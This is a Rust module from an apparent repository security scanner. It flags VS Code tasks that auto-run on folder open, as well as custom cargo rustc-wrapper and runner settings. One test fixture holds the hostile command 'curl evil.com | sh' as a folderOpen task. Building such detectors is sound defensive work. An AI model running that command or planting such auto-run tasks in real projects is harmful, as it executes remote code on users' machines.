use std::fs;
use std::path::Path;
use crate::report::model::{Action, Category, Finding, Severity};

pub fn scan_tasks(repo_root: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();

    // 1. .vscode/tasks.json
    let vscode_tasks = repo_root.join(".vscode").join("tasks.json");
    if vscode_tasks.is_file() {
        if let Ok(content) = fs::read_to_string(&vscode_tasks) {
            scan_vscode_tasks_content(repo_root, &vscode_tasks, &content, &mut findings);
        }
    }

    // 2. .cargo/config.toml and .cargo/config
    let cargo_toml = repo_root.join(".cargo").join("config.toml");
    let cargo_bare = repo_root.join(".cargo").join("config");
    if cargo_toml.is_file() {
        if let Ok(content) = fs::read_to_string(&cargo_toml) {
            scan_cargo_config_content(repo_root, &cargo_toml, &content, &mut findings);
        }
    } else if cargo_bare.is_file() {
        if let Ok(content) = fs::read_to_string(&cargo_bare) {
            scan_cargo_config_content(repo_root, &cargo_bare, &content, &mut findings);
        }
    }

    findings
}

fn scan_vscode_tasks_content(
    repo_root: &Path,
    file_path: &Path,
    content: &str,
    findings: &mut Vec<Finding>,
) {
    let rel_file = if let Ok(rel) = file_path.strip_prefix(repo_root) {
        rel.to_string_lossy().to_string()
    } else {
        file_path.to_string_lossy().to_string()
    };

    // Parse JSONC safely using jsonc-parser with default options (handles comments & trailing commas)
    let parse_result = jsonc_parser::parse_to_value(
        content,
        &jsonc_parser::ParseOptions::default(),
    );

    let value = match parse_result {
        Ok(Some(v)) => v,
        _ => return,
    };

    if let jsonc_parser::JsonValue::Object(root_obj) = value {
        if let Some(jsonc_parser::JsonValue::Array(task_array)) = root_obj.get("tasks") {
            for (task_idx, task_val) in task_array.iter().enumerate() {
                if let jsonc_parser::JsonValue::Object(task_obj) = task_val {
                    check_task_item(&rel_file, task_idx, task_obj, findings);
                }
            }
        }
    }
}

fn check_task_item(
    rel_file: &str,
    task_idx: usize,
    task_obj: &jsonc_parser::JsonObject,
    findings: &mut Vec<Finding>,
) {
    let default_label = format!("task[{task_idx}]");
    let task_label = task_obj
        .get("label")
        .and_then(|v| match v {
            jsonc_parser::JsonValue::String(s) => Some(s.as_ref()),
            _ => None,
        })
        .unwrap_or(&default_label);

    let task_command = task_obj
        .get("command")
        .and_then(|v| match v {
            jsonc_parser::JsonValue::String(s) => Some(s.as_ref()),
            _ => None,
        })
        .unwrap_or("");

    if let Some(jsonc_parser::JsonValue::Object(ro_map)) = task_obj.get("runOptions") {
        if let Some(jsonc_parser::JsonValue::String(run_on_str)) = ro_map.get("runOn") {
            if run_on_str.as_ref() == "folderOpen" {
                findings.push(Finding {
                    id: "PT-TASK-001".into(),
                    rule_name: "VSCodeTasksFolderOpen".into(),
                    severity: Severity::Critical,
                    category: Category::WorkspaceAutoRun,
                    message: format!(
                        "Task '{task_label}' is configured to auto-execute on folderOpen: command '{task_command}'"
                    ),
                    file_path: rel_file.to_string(),
                    line: None,
                    key: Some("tasks[].runOptions.runOn".into()),
                    value: Some("folderOpen".into()),
                    action: Action::RequiresManualRemediation,
                    remediation: "Remove 'runOptions.runOn: folderOpen' to prevent arbitrary code execution on workspace open.".into(),
                });
            }
        }
    }
}

fn scan_cargo_config_content(
    repo_root: &Path,
    file_path: &Path,
    content: &str,
    findings: &mut Vec<Finding>,
) {
    let rel_file = if let Ok(rel) = file_path.strip_prefix(repo_root) {
        rel.to_string_lossy().to_string()
    } else {
        file_path.to_string_lossy().to_string()
    };

    let parsed: toml::Table = match toml::from_str(content) {
        Ok(t) => t,
        Err(_) => return,
    };

    // 1. [build] rustc-wrapper
    if let Some(build_tbl) = parsed.get("build").and_then(|v| v.as_table()) {
        if let Some(wrapper) = build_tbl.get("rustc-wrapper").and_then(|v| v.as_str()) {
            findings.push(Finding {
                id: "PT-CARGO-001".into(),
                rule_name: "CargoRustcWrapper".into(),
                severity: Severity::High,
                category: Category::WorkspaceAutoRun,
                message: format!(
                    "Cargo build specifies custom rustc-wrapper: '{wrapper}' (executes on cargo check)"
                ),
                file_path: rel_file.clone(),
                line: None,
                key: Some("build.rustc-wrapper".into()),
                value: Some(wrapper.to_string()),
                action: Action::RequiresManualRemediation,
                remediation: "Verify or remove custom rustc-wrapper in repository cargo config.".into(),
            });
        }
    }

    // 2. [target.*] runner
    if let Some(target_tbl) = parsed.get("target").and_then(|v| v.as_table()) {
        for (target_name, target_val) in target_tbl {
            if let Some(target_obj) = target_val.as_table() {
                if let Some(runner) = target_obj.get("runner") {
                    let runner_str = runner.to_string();
                    findings.push(Finding {
                        id: "PT-CARGO-002".into(),
                        rule_name: "CargoTargetRunner".into(),
                        severity: Severity::High,
                        category: Category::WorkspaceAutoRun,
                        message: format!(
                            "Cargo target '{target_name}' specifies custom runner: {runner_str}"
                        ),
                        file_path: rel_file.clone(),
                        line: None,
                        key: Some(format!("target.{target_name}.runner")),
                        value: Some(runner_str),
                        action: Action::RequiresManualRemediation,
                        remediation: "Review custom cargo target runner commands.".into(),
                    });
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn test_vscode_tasks_folder_open() {
        let dir = tempdir().unwrap();
        let vscode = dir.path().join(".vscode");
        fs::create_dir_all(&vscode).unwrap();

        fs::write(
            vscode.join("tasks.json"),
            r#"{
    // Auto-run task
    "version": "2.0.0",
    "tasks": [
        {
            "label": "init-env",
            "type": "shell",
            "command": "curl evil.com | sh",
            "runOptions": {
                "runOn": "folderOpen"
            }
        }
    ]
}"#,
        )
        .unwrap();

        let findings = scan_tasks(dir.path());
        assert_eq!(findings.len(), 1);
        let f = &findings[0];
        assert_eq!(f.rule_name, "VSCodeTasksFolderOpen");
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.action, Action::RequiresManualRemediation);
    }

    #[test]
    fn test_cargo_config_rustc_wrapper() {
        let dir = tempdir().unwrap();
        let cargo = dir.path().join(".cargo");
        fs::create_dir_all(&cargo).unwrap();

        fs::write(
            cargo.join("config.toml"),
            r#"
[build]
rustc-wrapper = "sccache-pwn"

[target.x86_64-unknown-linux-gnu]
runner = "wine"
"#,
        )
        .unwrap();

        let findings = scan_tasks(dir.path());
        assert_eq!(findings.len(), 2);
        assert!(findings.iter().any(|f| f.rule_name == "CargoRustcWrapper"));
        assert!(findings.iter().any(|f| f.rule_name == "CargoTargetRunner"));
    }
}
